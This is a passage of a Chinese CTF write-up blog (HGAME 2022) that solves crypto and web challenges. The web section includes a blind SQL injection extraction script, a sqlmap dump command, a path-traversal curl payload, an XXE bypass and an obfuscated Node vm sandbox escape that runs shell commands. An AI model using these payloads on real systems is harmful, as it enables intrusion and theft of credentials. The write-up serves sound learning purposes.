fC4dhgwfNbCg6puxdT&#x2F;cz3LVLMvkPtKoPra1eOnCADWl7xVdVW9ZoWvXJUPYVb7G
U1zi8xC41aUNRHyxqGzKXE68sZRKUb+jn1rIgzXE1CX+tX&#x2F;GuzoqeaixXQyUsr9c
zerj6DiU5mBgAst5wVebvt1Izy36cLtgVe0zTgJp7pkPr+oQ8aJRw1J2&#x2F;8s8Q91I
kjfB7w&#x3D;&#x3D;
-----END PUBLIC KEY-----
</code></pre>

<p>再用公钥求私钥</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204172751433.png" alt="image-20220204172751433"></p>
<p>得到私钥</p>
<pre class="language-none"><code class="language-none">-----BEGIN RSA PRIVATE KEY-----
MIIHOgIBAAKCAgB8YNfjXEOhimdPq0kh+WM0IfRLCvq&#x2F;XAePL0PkAM55+&#x2F;nlEzPv
ZxW9PHi64GAYcMXPUVIxWvhbkXrVJkxt2+GzB13g1yCAebp0DeN9RbSPvV08IWsZ
nzHG8&#x2F;tV9UEByd76xOEO1MTanUBdrewtp0NWtkHvMKwmuKFVOWKypHT8JGnwZw5F
OGV9ABTJ4i2vA8WPcf36M2HRRIlUO6IXIZYcBMoORsCwF4XJ+6xyZNDIXKdt2hYk
m6M6ywCvRKj1Wj6zjls1eNt5mO8OOShMvs&#x2F;MXamEESd8Wv6qG4Dmld&#x2F;HmYVoBWqa
1mw7r2g46xf3hzDtcU9FIkypszXLh+9TK&#x2F;OEfZFqUq0jM97Sl9ltGvEkRfP4QEDA
&#x2F;MJxNtPk72pXmtx0iXmotX8SRSxvb3nksQXQeWrncKwZ58wY&#x2F;pVFZxKCzlJO5VUq
dRSymtez1wqQZoQORQdt&#x2F;iDOj4VB4fuL5VEsz6Svc9izyYaP4JCg67S6UQoTOipU
nLYX+DcR2jkVpwgCLkaC3Qqipkm0prE77OzAtWen+aX6HZXAluZZrOXBc1dq795C
S9jSjn&#x2F;ESSfucY2XX1FdPBlaEpTt2QXW1l0cZtDZq9hylZa&#x2F;zwdynj+DQq1iz&#x2F;Tn
15+f0iEV1xIIOUemq3gec5N&#x2F;YXHoLqzv208DaIXOH0fPWF1xho9D0ji4XwKCAgAS
80JghvxDHD8c9vFPSKymBJ28qaUmYvDWWxUGgMpjfaV3H65MmMFQMAFmTGYbNlUS
BpXs8nLc20lTyoFF67Cb6IUxpZiooKg6UaEn6z1w5ZgMINeUMNz0SFlBxO3DyiSo
TyQvAu4QGtQay69VJPH5fgk&#x2F;A3IrnavkX8&#x2F;Vw03OyOBdwcYXqvE&#x2F;QHmTzdLBywN7
updQFsN06IUJxIuGS+iI9PHMkQ8TzwYnRzbI38TcA1ulPzWBYxmFqf+nell4W&#x2F;O9
HKzTjChULhpX2BRztLIk5jcyNr0v76flroGuJ+FUkD1dbuljRR5MHOYKi7V22grn
xTr97W7IsSO1x+UeLGcOcKiDweh&#x2F;su1THCX1h3sxB8pffkJ1b6hNPCRD5Xzdtd8N
pddzejKvP3Zz5kWnrjCv&#x2F;t5nrMKbo1qy9T4&#x2F;vBl1naLBDCBD2D6&#x2F;4peeJ0NDZICG
wQN2xaEuGZHnsNSMDWTENIqh8jA11&#x2F;CevOCyfC4dhgwfNbCg6puxdT&#x2F;cz3LVLMvk
PtKoPra1eOnCADWl7xVdVW9ZoWvXJUPYVb7GU1zi8xC41aUNRHyxqGzKXE68sZRK
Ub+jn1rIgzXE1CX+tX&#x2F;GuzoqeaixXQyUsr9czerj6DiU5mBgAst5wVebvt1Izy36
cLtgVe0zTgJp7pkPr+oQ8aJRw1J2&#x2F;8s8Q91IkjfB7wIJALW5aE5wHIlPAoIBAQCo
tra8EGmcotwH&#x2F;ZDGjC4Z8ogha4CMuHNdkeIBwjStJor8O0NCarLdkQT6NMtSUYBN
5lcKx7upYPmL7ZPVnmcV9le23PFZpVSgILJO5e85BwwdJVhToam3u8uEh47B2enI
FkWTMO18zvYBFrLqB8VgUfsQN4isa5HbQFI9T9MDe0TugTNnLC6kx6aKpVBsUqmk
aUOzN586tD0Ppo6kW570+4GdepUqKyGjnz80d2fwStarw8Ez67IKEhOSDEiAyuoN
duZRC4gZVfhHX&#x2F;umElWVmtfbtJGHmbCf2+g&#x2F;3PZy65f5qNqwGHxd3zU5tku2EVT9
h01jhuwEZLuinp3L1t6pAoIBAQC8uh&#x2F;FzJl8zlzGon3u0V0SSgjI9oWStsp2K6Fl
IDEWTAVMdYQZCOwxObcVwivwz8ovDMmvoA3hKBh+8rzmJeYJ3MyubkCV+FNo&#x2F;y1X
DzJdemGbAyPUnEeCgOEbJrqHqzk1W0d6oLtr6HuSIswK4yNglsLWM+16S+WQEKi2
E1yuzC+uq279ezOx39FbXGxlLDSyKOb9oJXVuZWnhCyJA27d&#x2F;cYDlmSQ0JvX3xiD
fG10MYFOSqpDsNS7LLOf+LK8WRH4m6iFQHcX7sgs6HH48ACig+agyRSJCaN&#x2F;b&#x2F;PQ
6o99jpkCmYSo2vO8qScAZFbEucrjtOkOtWOBhc9xrSbPuWvHAgkAtbloTnAciU8C
CQC1uWhOcByJTwKCAQAl77&#x2F;PElSLSo1fNYoMKafuVi48Fjx0iUntMVmcNB7Xe9hV
CAIojVVQu2ux1w&#x2F;91oMgui8wbN6dbZg&#x2F;cd0CgLtxfgwhTjX75CxB97oahAkxuP3L
BeqOHx2uy6B6TNfFHR76srqhQxgz9MWW8IUstpNnBV91CtOYyRBQsCuKchS+Asb+
Z3+W08eWjKNN68jPBohKjD15FYy4&#x2F;W03t2NBtKNb7UoLynBTni&#x2F;Bjq86ZWNOUG3v
gPuI48t&#x2F;Px2F4wS51wfzGZDfutBNM2dO+a3DcwNGctqkxFriQuD0tQkYtei6R92f
lUtMgGyxmfNgmbdycrcjDislpPUj9+NkD1ce2f28
-----END RSA PRIVATE KEY-----</code></pre>

<p>再利用私钥求pq</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204172904395.png" alt="image-20220204172904395"></p>
<p>得到pq之后找个rsa脚本带进去就行</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204172948397.png" alt="image-20220204172948397"></p>
<h3 id="Block-Cipher"><a href="#Block-Cipher" class="headerlink" title="Block Cipher"></a>Block Cipher</h3><p>加密脚本</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204173328550.png" alt="image-20220204173328550"></p>
<p>给了三个值</p>
<p>iv = b&#39;Up\x14\x98r\x14%\xb9&#39;</p>
<p>key = b&#39;\r\xe8\xb86\x9c33^&#39;</p>
<p>parts = [b&#39;0\xff\xcd\xc3\x8b\T\x8b&#39;, b&#39;RT\x1e\x89t&amp;\x17\xbd&#39;, b&#39;\x1a\xee\x8d\xd6\x9b&gt;w\x8c&#39;, b&#39;9CT\xb3^pF\xd0&#39;]</p>
<p>加密的逻辑大致是将flag每八个字符一组，不够的在末尾加上chr(len(该段长度))重复一定次数凑够八个字符,同时构造有八组数据的iv和key变量，并与flag分成的组进行一次异或操作，将异或操作后的内容作为下一次异或操作的iv。同时将异或后的内容放入results列表中</p>
<p>其中返回值的内容都是可迭代类型，所以要利用for循环才能读出里面的内容</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204175512017.png" alt="image-20220204175512017"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204173726545.png" alt="image-20220204173726545"></p>
<p>八个一组的数字</p>
<p>也就相当于第一组48 = 85^13^ord(flag的第一个字符)即ord(&#39;h&#39;)</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204175945549.png" alt="image-20220204175945549"></p>
<p>经过测试这个也能逆推</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204180050478.png" alt="image-20220204180050478"></p>
<p>所以只要根据加密脚本将flag变为给的parts里的内容就能分段解密</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204180213786.png" alt="image-20220204180213786"></p>
<p>贴一下其他师傅写的解码脚本（我是菜b</p>
<pre class="language-python" data-language="python"><code class="language-python">import operator
import gmpy2
from Crypto.Util.number import long_to_bytes
import random
from functools import reduce

iv &#x3D; b&#39;Up\x14\x98r\x14%\xb9&#39;
key &#x3D; b&#39;\r\xe8\xb86\x9c33^&#39;
parts &#x3D; [b&#39;0\xff\xcd\xc3\x8b\\T\x8b&#39;, b&#39;RT\x1e\x89t&amp;\x17\xbd&#39;, b&#39;\x1a\xee\x8d\xd6\x9b&gt;w\x8c&#39;, b&#39;9CT\xb3^pF\xd0&#39;]
results &#x3D; []

def xor(a, b):
    assert len(a) &#x3D;&#x3D; len(b)
    return bytes(map(operator.xor, a, b))

def decrypt():
    for index, part in enumerate(parts):
        results.append(reduce(xor, [part, iv if index &#x3D;&#x3D; 0 else parts[index - 1], key]))

decrypt()
print(results)</code></pre>



<h2 id="WEB-2"><a href="#WEB-2" class="headerlink" title="WEB"></a>WEB</h2><h3 id="SecurityCenter"><a href="#SecurityCenter" class="headerlink" title="SecurityCenter"></a>SecurityCenter</h3><p>看一下这个路径</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204190318143.png" alt="image-20220204190318143"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204190356431.png" alt="image-20220204190356431"></p>
<p>再结合</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204190428652.png" alt="image-20220204190428652"></p>
<p>猜测是twig的模板注入</p>
<p>参考链接</p>
<p><a target="_blank" rel="noopener" href="https://whoamianony.top/2021/08/22/Web%E5%AE%89%E5%85%A8/Twig%20%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/">https://whoamianony.top/2021/08/22/Web%E5%AE%89%E5%85%A8/Twig%20%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/</a></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204190615656.png" alt="image-20220204190615656"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204190633423.png" alt="image-20220204190633423"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204190655380.png" alt="image-20220204190655380"></p>
<p>cat应该是被过滤了，可以用tac看一下</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204190732690.png" alt="image-20220204190732690"></p>
<p>把含有hgame内容的字符串也过滤了，尝试逆向输出</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204190810214.png" alt="image-20220204190810214"></p>
<p>成功，拿到flag</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204190827635.png" alt="image-20220204190827635"></p>
<h3 id="Vidar-shop-demo"><a href="#Vidar-shop-demo" class="headerlink" title="Vidar shop demo"></a>Vidar shop demo</h3><p>看这个描述就像支付逻辑漏洞</p>
<p>先随便注册个账户进入</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204180704485.png" alt="image-20220204180704485"></p>
<p>看看商店，flag要一万，我们只有九千九百九十九</p>
<p>先买个徽章试试</p>
<p>发现购买的徽章如果删除，购买花费的钱也会返还，所以试试再开一个网页，同时删除徽章</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204180850691.png" alt="image-20220204180850691"></p>
<p>成功大于一万了，买个flag</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220204180917539.png" alt="image-20220204180917539"></p>
<h3 id="LoginMe"><a href="#LoginMe" class="headerlink" title="LoginMe*"></a>LoginMe*</h3><p>sql注入，给的hint很明显就是sql语句</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220212223934416.png" alt="image-20220212223934416"></p>
<p>但是因为平常的题都是mysql的，这个是 sqlite，所以只试出了注入点，其他的就没注</p>
<p>sqlite因为其比较简易每个db文件就是一个数据库，所以不存在information_schema数据库，但存在类似作用的表sqlite_master。</p>
<p>该表记录了该库下的所有表，索引，表的创建sql等所以我们可以通过此读取数据，常见语句如下。</p>
<pre class="language-none"><code class="language-none">1 读取表名：select group_concat(name) from sqlite_master where type&#x3D;&#39;table&#39;
2 读取字段：select group_concat(sql) from sqlite_master where type&#x3D;&#39;table&#39; and name&#x3D;&#39;表名&#39;</code></pre>

<p>看看表名</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220212232736925.png" alt="image-20220212232736925"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220212232755661.png" alt="image-20220212232755661"></p>
<p>证明确实能注，可以写个脚本</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220212233244464.png" alt="image-20220212233244464"></p>
<p>反正最后表名是uuussseeerrrsss</p>
<p>后边的脚本（手注太慢了</p>
<pre class="language-none"><code class="language-none">import requests

url &#x3D; &quot;http:&#x2F;&#x2F;d51f66203d.login.summ3r.top:60067&#x2F;login&quot;
date &#x3D; &#123;&quot;username&quot;:&quot;test&#39;) and substr((select sql from sqlite_master where type&#x3D;&#39;table&#39; and name&#x3D;&#39;uuussseeerrrsss&#39;),&#123;&#125;,1)&#x3D;&#39;&#123;&#125;&#39;--+&quot;,&quot;password&quot;:&quot;test&quot;&#125;
flag &#x3D; &#39;&#39;
for i in range(1,200):
    for j in range(31,127):
        #列名
        #date[&quot;username&quot;] &#x3D; &quot;test&#39;) and substr((select sql from sqlite_master where type&#x3D;&#39;table&#39; and name&#x3D;&#39;uuussseeerrrsss&#39;),&#123;&#125;,1)&#x3D;&#39;&#123;&#125;&#39;--+&quot;.format(i,chr(j))
        #读数据
        date[&quot;username&quot;] &#x3D; &quot;test&#39;) and substr((select group_concat(password) from uuussseeerrrsss),&#123;&#125;,1)&#x3D;&#39;&#123;&#125;&#39;--+&quot;.format(i,chr(j))
        r &#x3D; requests.post(url,json&#x3D;date);
        response &#x3D; r.text
        if &#39;success&#39; in response:
            flag +&#x3D;chr(j)
            print(flag)
            break
print(flag)</code></pre>

<p>拿到密码之后登录就行</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220213003003539.png" alt="image-20220213003003539"></p>
<p>也可以用sqlmap直接跑</p>
<p>bp抓包之后保存到本地</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220213004158890.png" alt="image-20220213004158890"></p>
<p>然后上sqlmap</p>
<p>python sqlmap.py -r &quot;D:\Desktop\post.txt&quot; --dump --batch --threads 10 --no-cast --flush-session</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220213004815203.png" alt="image-20220213004815203"></p>
<h1 id="第四周wp"><a href="#第四周wp" class="headerlink" title="第四周wp"></a>第四周wp</h1><h2 id="WEB-3"><a href="#WEB-3" class="headerlink" title="WEB"></a>WEB</h2><h3 id="FileSystem"><a href="#FileSystem" class="headerlink" title="FileSystem"></a>FileSystem</h3><p>又是go语言的题</p>
<p>很明显flag在there may be a flag里但是没法访问到</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220214215644843.png" alt="image-20220214215644843"></p>
<p>因为根据main.go里的内容可以看到这个路由被出题人加上了web服务,从而使得我们没法通过直接访问<code>/there may be a flag</code>来获取文件。而是得到<code>/there may be a flag</code>路由的回显。</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220214215629146.png" alt="image-20220214215629146"></p>
<p>谷歌找一下ctf里出现过的go语言漏洞</p>
<p><a target="_blank" rel="noopener" href="https://bycsec.top/2021/02/07/golang%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/">https://bycsec.top/2021/02/07/golang%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</a></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220214215905860.png" alt="image-20220214215905860"></p>
<p>利用相对路径访问</p>
<p>对于 CONNECT 请求，路径和主机保持不变。</p>
<p>和这道题的考点一模一样，可以仿照其payload仿写一个</p>
<pre class="language-none"><code class="language-none">curl --path-as-is -X CONNECT http:&#x2F;&#x2F;6a87cb1c66.filesystem.hgame.homeboyc.cn&#x2F;main.go&#x2F;..&#x2F;there_may_be_a_flag</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220214215820089.png" alt="image-20220214215820089"></p>
<h3 id="Comment"><a href="#Comment" class="headerlink" title="Comment*"></a>Comment*</h3><p>考点：xxe注入</p>
<p>源码：</p>
<pre class="language-none"><code class="language-none">&lt;?php
require &#39;.&#x2F;init.php&#39;;
require_once &#39;.&#x2F;db.php&#39;;

libxml_disable_entity_loader(false);

function waf($str): bool &#123;
    if (preg_match(&#39;&#x2F;file|glob|http|dict|gopher|php|ftp|ssh|phar&#x2F;i&#39;, $str)) &#123;
        return true;
    &#125;
    return false;
&#125;

function save() &#123;
    if ($_SERVER[&#39;REQUEST_METHOD&#39;] !&#x3D; &#39;POST&#39;) &#123;
        echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;wrong method&#39;]);
        return;
    &#125;
    $data &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);
    if (waf($data)) &#123;
        http_response_code(403);
        echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;Hacker!&#39;]);
        return;
    &#125;

    $id &#x3D; $_SESSION[&#39;unique_id&#39;];
    $db &#x3D; getDB();

    $stmt &#x3D; $db-&gt;prepare(&#39;INSERT INTO comments (sender,content) VALUES (?,?)&#39;);
    $stmt-&gt;execute([$id, $data]);
    if ($stmt-&gt;rowCount() !&#x3D; 0) &#123;
        echo json_encode([&#39;msg&#39; &#x3D;&gt; &#39;success&#39;]);
    &#125; else &#123;
        http_response_code(500);
        echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;failed to create records&#39;]);
    &#125;
&#125;

function parseXML($str) &#123;
    $dom &#x3D; new DOMDocument();
    try &#123;
        $dom-&gt;loadXML($str, LIBXML_NOENT | LIBXML_DTDLOAD);
    &#125; catch (Exception $e) &#123;
        http_response_code(400);
        echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;invalid xml data&#39;]);
        die();
    &#125;
    $attrs &#x3D; simplexml_import_dom($dom);
    if (!isset($attrs-&gt;content)) &#123;
        http_response_code(400);
        echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;content is empty&#39;]);
        die();
    &#125;
    if (waf($attrs-&gt;sender) || waf($attrs-&gt;content)) &#123;
        http_response_code(403);
        echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;Hacker!&#39;]);
        die();
    &#125;
    if ($attrs-&gt;sender &#x3D;&#x3D; &#39;admin&#39; &amp;&amp; !preg_match(&#39;&#x2F;admin&#x2F;i&#39;, $str)) &#123;
        $flag &#x3D; &#39;hgame&#123;xxxxx&#125;&#39;;
        $attrs-&gt;content &#x3D; $flag;
    &#125;
    return $attrs;
&#125;

function get() &#123;
    $id &#x3D; $_SESSION[&#39;unique_id&#39;];

    $db &#x3D; getDB();
    $stmt &#x3D; $db-&gt;prepare(&#39;SELECT * FROM comments WHERE sender&#x3D;?&#39;);
    $stmt-&gt;execute([$id]);
    $data &#x3D; $stmt-&gt;fetchAll();
    $result &#x3D; [];
    foreach ($data as $key &#x3D;&gt; $val) &#123;
        array_push($result, parseXML($val[&#39;content&#39;]));
    &#125;

    echo json_encode($result);

&#125;

switch ($_GET[&#39;action&#39;]) &#123;
    case &#39;get&#39;:
        get();
        break;
    case &#39;add&#39;:
        save();
        break;
    case &#39;info&#39;:
        echo json_encode([&#39;unique_id&#39; &#x3D;&gt; $_SESSION[&#39;unique_id&#39;]]);
        break;
    default:
        http_response_code(400);
        echo json_encode([&#39;error&#39; &#x3D;&gt; &#39;no such action&#39;]);
        break;
&#125;</code></pre>

<p>先抓个包看看</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220220230401250.png" alt="image-20220220230401250"></p>
<p>挺明显的xxe</p>
<p>然后就要满足获取flag的条件</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220220230438960.png" alt="image-20220220230438960"></p>
<p>要求sender里有admin但是传入的内容不许有admin</p>
<p>可以尝试data协议</p>
<p>（比赛的时候不知道怎么想的一直想绕过waf读文件。。。忘了data协议</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220220234723611.png" alt="image-20220220234723611"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220220232831204.png" alt="image-20220220232831204"></p>
<h3 id="Markdown-Online"><a href="#Markdown-Online" class="headerlink" title="Markdown Online*"></a>Markdown Online*</h3><p>看一下源码</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220221141602097.png" alt="image-20220221141602097"></p>
<p>toUpperCase()是将小写转换为大写，但是这样也绝不可能绕过54gk的这个if判断</p>
<p>利用了try catch但是catch并没有return语句，也就导致try中的代码抛出错误后继续往下执行</p>
<p>所以就要想办法让req.body.password = req.body.password.toUpperCase()报错</p>
<p>对 req.body.password.toUpperCase() 正确的解读方式是：获取 req.body.password对象的 toUpperCase属性，然后把这个属性当作函数来调用。如果这个属性不是函数对象就会抛出错误</p>
<p>所以可以用</p>
<pre class="language-js" data-language="js"><code class="language-js"><span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token operator">:</span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token string">"password"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></code></pre>

<p>或</p>
<pre class="language-js" data-language="js"><code class="language-js"><span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token operator">:</span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token string">"password"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token string">"length"</span><span class="token operator">:</span> <span class="token number">16</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>

<p>都可以满足第一个if的length==16的判断并让toUpperCase()报错</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220221143354198.png" alt="image-20220221143354198"></p>
<p>然后我们访问/md</p>
<p>在这部分</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220221143602581.png" alt="image-20220221143602581"></p>
<p>利用markdownit库，并对html标签支持</p>
<p>在提交的地方</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220221144119817.png" alt="image-20220221144119817"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220221144044221.png"></p>
<p>在 SubmitController 里，markdown-it 解析出来的 html 代码会被 zombie.js 加载，zobmie.js 在遇到 JavaScript 代码的时候会将其交给 vm 虚拟机执行</p>
<p>而vm模块是存在逃逸的， JavaScript 对象的继承是靠原型链实现的，借助原型链可访问到 vm 沙箱以外的内容，实现 RCE</p>
<p>百度找个vm逃逸的payload</p>
<pre class="language-none"><code class="language-none">this.__proto__.constructor.constructor(&#39;return process&#39;)().mainModule.require(&#39;child_process&#39;).execSync(&#39;calc&#39;)</code></pre>

<p>然后还要绕过waf</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220221144435975.png" alt="image-20220221144435975"></p>
<p>利用 JavaScript 的语言特性， obj.contructor 可以变为 obj[&quot;contr&quot;+&quot;uctor&quot;] 的形式， + 也被 ban 了，可以用concat拼接字符串的形式: obj[&quot;constru&quot;.concat(&quot;ctor&quot;)] this 和 process 可以用 eval(&quot;th&quot;+&quot;is&quot;) 的形式绕过。</p>
<p>这里eval和String.fromCharCode都没被过滤，可以用这个绕过</p>
<pre class="language-python" data-language="python"><code class="language-python">a &#x3D; &quot;document.write(this.__proto__.constructor.constructor(&#39;return process&#39;)().mainModule.require(&#39;child_process&#39;).execSync(&#39;ls &#x2F;&#39;))&quot;
b &#x3D; []
for i in range(len(a)):
    b.append(ord(a[i]))
print(b)</code></pre>

<pre class="language-none"><code class="language-none">&lt;script&gt;eval(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 119, 114, 105, 116, 101, 40, 116, 104, 105, 115, 46, 95, 95, 112, 114, 111, 116, 111, 95, 95, 46, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 46, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 40, 39, 114, 101, 116, 117, 114, 110, 32, 112, 114, 111, 99, 101, 115, 115, 39, 41, 40, 41, 46, 109, 97, 105, 110, 77, 111, 100, 117, 108, 101, 46, 114, 101, 113, 117, 105, 114, 101, 40, 39, 99, 104, 105, 108, 100, 95, 112, 114, 111, 99, 101, 115, 115, 39, 41, 46, 101, 120, 101, 99, 83, 121, 110, 99, 40, 39, 108, 115, 32, 47, 39, 41, 41))&lt;&#x2F;script&gt;</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220221150403606.png" alt="image-20220221150403606"></p>
<p>然后cat /flag</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220221150727819.png" alt="image-20220221150727819"></p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">Ethe</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://Ethe448.github.io/2022/01/21/HGAME2022-wp/">https://Ethe448.github.io/2022/01/21/HGAME2022-wp/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">Ethe</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/ctf/">
                                    <span class="chip bg-color">ctf</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
